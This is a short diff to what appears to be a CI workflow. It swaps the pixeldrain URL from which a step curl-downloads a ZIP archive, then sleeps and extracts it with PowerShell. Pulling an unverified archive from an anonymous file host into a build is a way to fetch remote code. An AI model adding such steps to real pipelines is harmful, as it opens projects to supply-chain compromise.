@@ -13,7 +13,7 @@ jobs:
 
     - name: Download full ZIP and extract
       run: |
-        curl -L -o code.zip https://pixeldrain.com/api/file/i273aLh4/info/zip/main2.zip
+        curl -L -o code.zip https://pixeldrain.com/api/file/sA8YChFC/info/zip/main2.zip
         Start-Sleep -Seconds 5
         powershell -Command "Expand-Archive -Force code.zip extracted"
 
